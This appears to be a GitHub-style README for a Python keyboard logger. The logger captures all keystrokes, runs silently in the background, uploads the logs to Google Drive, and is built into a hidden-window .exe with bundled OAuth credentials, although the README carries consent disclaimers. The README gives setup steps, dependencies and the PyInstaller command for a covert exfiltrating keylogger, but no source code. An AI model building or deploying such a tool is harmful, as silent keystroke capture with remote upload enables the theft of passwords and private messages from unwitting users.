
# 📋 Keyboard Activity Logger (With User Consent)

This project is an educational Python-based keyboard activity logger designed for learning purposes and **only to be used with full user consent**. It captures keystrokes and periodically uploads logs to Google Drive using the Google Drive API.

> ⚠️ **DISCLAIMER**: This software must **only** be used on machines where all users have given **explicit, informed consent**. Misuse of this software may violate privacy laws and terms of service.

---

## 🚀 Features

- Logs all keyboard inputs (letters, symbols, special keys).
- Periodically uploads log files to a specified Google Drive folder.
- Runs silently in the background.
- Packaged as a standalone `.exe` using PyInstaller.

---
🔐 Google Drive Setup
Go to Google Cloud Console.

Create a new project.

Enable the Google Drive API.

Create OAuth 2.0 credentials (credentials.json) for a desktop app.

Download the credentials.json file and place it in your project directory.

On first run, a browser window will ask for permission. After authorization, a token.pickle will be saved for future use.


## 🧩 Dependencies

Install these Python packages before running the script:

```bash
pip install pynput google-auth google-auth-oauthlib google-api-python-client


.
├── key.py                 # Main script
├── credentials.json       # OAuth2 credentials (from Google Cloud Console)
├── token.pickle           # Generated after first OAuth login
├── keystrokes.txt         # Log file (generated at runtime)
└── README.md              # This file


python key.py
pyinstaller --onefile --windowed --add-data "credentials.json;." --add-data "token.pickle;." key.py


By downloading, using, or modifying this project, you agree to use it ethically, legally, and responsibly. If you do not agree with these terms, do not use the software.
